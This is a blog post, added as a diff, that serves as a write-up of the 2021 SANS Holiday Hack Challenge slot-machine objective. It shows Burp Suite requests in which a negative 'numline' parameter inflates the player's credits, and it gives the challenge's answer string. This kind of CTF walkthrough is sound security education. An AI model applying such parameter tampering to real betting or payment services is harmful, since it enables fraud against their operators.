@@ -1,0 +1,188 @@
+---
+title:  "Objective 4: Slot Machine Investigation - 2021 SANS Holiday Hack Challenge"
+date:   "2022-01-05 00:04:00 -0800"
+categories: HolidayHack2021
+header:
+ teaser: /assets/images/HolidayHack2021/slots.png
+---
+
+In this challenge, we're going to do a bit of web app pen testing on a virtual slot machine site.
+
+[Play the 2021 SANS Holiday Hack Challenge](https://2021.kringlecon.com/invite)
+
+## Objective
+>Test the security of Jack Frost's [slot machines](https://slots.jackfrosttower.com/). What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element.
+
+This uses an external site, https://slots.jackfrosttower.com.
+
+## Hint
+- It seems they're susceptible to [parameter tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering).
+
+## Enumeration
+Going to https://slots.jackfrosttower.com and hitting "Play Game" brings us to a page for "Frosty Slots". Once you hit the Play Game button and then the Play button it brings you to a page with the slots on screen. There are a few parameters you can play with and then you can hit the Spin button to roll the slots.
+
+![Slots screen](/assets/images/HolidayHack2021/slots.png)
+
+I have [Burp Suite](https://portswigger.net/burp) already downloaded and set up, so I fired that up, set up my browser to use Burp as its proxy, and turned the intercept on in the Proxy tab.
+
+When we hit Spin again, Burp catches the POST request. I then sent this to Burp's repeater tab to start messing with it.
+
+**Request:**
+```http
+POST /api/v1/cda78409-427d-42a1-b454-f6c864c972e4/spin HTTP/2
+
+Host: slots.jackfrosttower.com
+Cookie: XSRF-TOKEN=eyJpdiI6InZ0MjdmYTB5NzR0bmhybC9ISkUzVUE9PSIsInZhbHVlIjoidXExMUYvRld4a2xvZ3B2Um5sS2tHTm56R2FFTVlNT3U3S0xlbVdEZllpUjJHRlpweDFWNmY4UWNWZWUybHFhNlluUC9jWEh4dUtnbkdveTBBTEkzVHlGbnpNbzhMQ3k3M1E2Y0NKK0FJS28yT2NydDFvRVZkcjdkcThQMTV4TXQiLCJtYWMiOiIwMDI5MzAyMDg1MjAwNzFhNWI1OWIyNDIxZTcyYjY4NTdkYjg1OGZkMjViYzUyOTdiNTU2YmMyMzVjNDRmYzUyIiwidGFnIjoiIn0%3D; slots_session=eyJpdiI6IkVMelBXSGJzUVR2NlE4QWJzYmNIRnc9PSIsInZhbHVlIjoidjBHbWlxNzlrK3o5QXpHMk9XNDBiS2pLM25XcUpuWWczRTNQT3NFYko3KzYyU3JUN0JhYXVmY1QvREdhTlM2djBpZkYvWmJWSWVidkNlblp4ZmVrbzdqYzdja1MxaWpLWHRUdlJkWGJ2SU5EOExrSjdUblJSUzZrdDcxR0pJWTAiLCJtYWMiOiI0NTQzMjhlMjg4MTNhOGEyNmI2OWVjMDkwODExZjkzNGExZTdhYWE2NGU3YzgwZGNlMWQyYWU4NTk2MmExY2UyIiwidGFnIjoiIn0%3D
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://slots.jackfrosttower.com/uploads/games/frostyslots-861175/index.html
+Content-Type: application/x-www-form-urlencoded
+X-Ncash-Token: 1874131c-17c6-44f1-971c-5d19c7d1560d
+Origin: https://slots.jackfrosttower.com
+Content-Length: 37
+Te: trailers
+
+
+
+betamount=1&numline=20&cpl=0.1
+```
+
+**Response:**
+```
+HTTP/2 200 OK
+
+Date: Tue, 04 Jan 2022 23:44:06 GMT
+Date: Tue, 04 Jan 2022 23:44:06 GMT
+X-Powered-By: PHP/7.4.26
+Cache-Control: no-cache, private
+Content-Type: application/json
+X-Ratelimit-Limit: 60
+X-Ratelimit-Remaining: 59
+Access-Control-Allow-Origin: *
+Via: 1.1 google
+Alt-Svc: clear
+
+{
+	"success":true,
+	"data":{
+		"credit":99.5,
+		"jackpot":0,
+		"free_spin":0,
+		"free_num":0,
+		"scaler":0,
+		"num_line":20,
+		"bet_amount":1,
+		"pull":{
+			"WinAmount":1.5,
+			"FreeSpin":0,
+			"WildFixedIcons":[],
+			"HasJackpot":false,
+			"HasScatter":false,
+			"WildColumIcon":"",
+			"ScatterPrize":0,
+			"SlotIcons":["icon8","icon5","icon4","icon8","icon10","icon3","wild","scatter","icon9","icon7","icon6","icon4","icon6","icon5","icon5"],
+			"ActiveIcons":[11,7,13],
+			"ActiveLines":[15]
+		},
+		"response":"Keep playing!"
+	},
+	"message":"Spin success"
+}
+```
+
+What was most interesting was the body of the request:
+```
+betamount=1&numline=20&cpl=0.1
+```
+
+## Exploitation
+
+What happens when we try to put unexpected values into these parameters?
+
+After some trial and error, it seems that when we put in negative numbers for the "numline" parameter, the site always increases our credits by one tenth of the abolute value of the numline amount.
+
+Given that, let's just enter "-1000" for the "numline" parameter and hit the send button in Burp Suite a few times to get our credits over 1000.
+
+**Edited post request:**
+```http
+POST /api/v1/cda78409-427d-42a1-b454-f6c864c972e4/spin HTTP/2
+
+Host: slots.jackfrosttower.com
+Cookie: XSRF-TOKEN=eyJpdiI6InZ0MjdmYTB5NzR0bmhybC9ISkUzVUE9PSIsInZhbHVlIjoidXExMUYvRld4a2xvZ3B2Um5sS2tHTm56R2FFTVlNT3U3S0xlbVdEZllpUjJHRlpweDFWNmY4UWNWZWUybHFhNlluUC9jWEh4dUtnbkdveTBBTEkzVHlGbnpNbzhMQ3k3M1E2Y0NKK0FJS28yT2NydDFvRVZkcjdkcThQMTV4TXQiLCJtYWMiOiIwMDI5MzAyMDg1MjAwNzFhNWI1OWIyNDIxZTcyYjY4NTdkYjg1OGZkMjViYzUyOTdiNTU2YmMyMzVjNDRmYzUyIiwidGFnIjoiIn0%3D; slots_session=eyJpdiI6IkVMelBXSGJzUVR2NlE4QWJzYmNIRnc9PSIsInZhbHVlIjoidjBHbWlxNzlrK3o5QXpHMk9XNDBiS2pLM25XcUpuWWczRTNQT3NFYko3KzYyU3JUN0JhYXVmY1QvREdhTlM2djBpZkYvWmJWSWVidkNlblp4ZmVrbzdqYzdja1MxaWpLWHRUdlJkWGJ2SU5EOExrSjdUblJSUzZrdDcxR0pJWTAiLCJtYWMiOiI0NTQzMjhlMjg4MTNhOGEyNmI2OWVjMDkwODExZjkzNGExZTdhYWE2NGU3YzgwZGNlMWQyYWU4NTk2MmExY2UyIiwidGFnIjoiIn0%3D
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://slots.jackfrosttower.com/uploads/games/frostyslots-861175/index.html
+Content-Type: application/x-www-form-urlencoded
+X-Ncash-Token: 1874131c-17c6-44f1-971c-5d19c7d1560d
+Origin: https://slots.jackfrosttower.com
+Content-Length: 37
+Te: trailers
+
+betamount=1&numline=-1000&cpl=0.1
+```
+
+
+**Server response once we get to 1000 credits:**
+```
+HTTP/2 200 OK
+
+Date: Fri, 10 Dec 2021 21:16:24 GMT
+Date: Fri, 10 Dec 2021 21:16:24 GMT
+X-Powered-By: PHP/7.4.26
+Cache-Control: no-cache, private
+Content-Type: application/json
+X-Ratelimit-Limit: 60
+X-Ratelimit-Remaining: 59
+Access-Control-Allow-Origin: *
+Via: 1.1 google
+Alt-Svc: clear
+
+{
+	"success":true,
+	"data:{
+		"credit":1000,
+		"jackpot":0,
+		"free_spin":0,
+		"free_num":0,
+		"scaler":0,
+		"num_line":-1000,
+		"bet_amount":1,
+		"pull":{
+			"WinAmount":0,
+			"FreeSpin":0,
+			"WildFixedIcons":[],
+			"HasJackpot":false,
+			"HasScatter":false,
+			"WildColumIcon":"",
+			"ScatterPrize":0,
+			"SlotIcons":[
+				"wild",
+				"icon2",
+				"wild",
+				"icon1",
+				"icon6",
+				"icon1",
+				"icon5",
+				"wild",
+				"wild",
+				"icon8",
+				"icon7",
+				"icon4",
+				"icon8",
+				"icon10",
+				"icon4"
+			],
+			"ActiveIcons":[],
+			"ActiveLines":[]
+		},
+		"response":"I'm going to have some bouncer trolls bounce you right out of this casino!"
+	},
+	"message":"Spin success"
+}
+```
+
+**Answer:** I'm going to have some bouncer trolls bounce you right out of this casino!
